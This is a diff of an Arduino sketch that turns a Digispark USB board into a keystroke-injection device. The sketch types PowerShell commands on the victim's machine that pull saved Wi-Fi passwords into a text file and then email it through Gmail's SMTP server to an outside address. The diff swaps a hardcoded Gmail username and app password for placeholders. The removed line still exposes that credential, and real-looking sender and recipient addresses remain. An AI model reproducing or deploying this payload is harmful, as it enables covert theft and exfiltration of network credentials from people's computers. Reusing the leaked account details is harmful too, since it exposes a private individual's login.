@@ -29,8 +29,8 @@ void loop() {
   DigiKeyboard.print(F("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS.txt")); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);  
-  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('dominikefe2002', 'vksakzguhuoycaog'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'dominikefe2002@gmail.com'; $ReportEmail.To.Add('ali_efe0@outlook.com'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('Wi-Fi-PASS.txt'); $SMTPInfo.Send($ReportEmail)"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR_GMAIL_NAME_HERE', 'YOUR_GMAIL_APP_PASSWORD_HERE'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'dominikefe2002@gmail.com'; $ReportEmail.To.Add('ali_efe0@outlook.com'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('Wi-Fi-PASS.txt'); $SMTPInfo.Send($ReportEmail)"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);                                                                                                                                                //enter example if your mail is example@gmail.com
   DigiKeyboard.delay(2000);  
   DigiKeyboard.print(F("exit")); //Jumping to temporary dir 
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
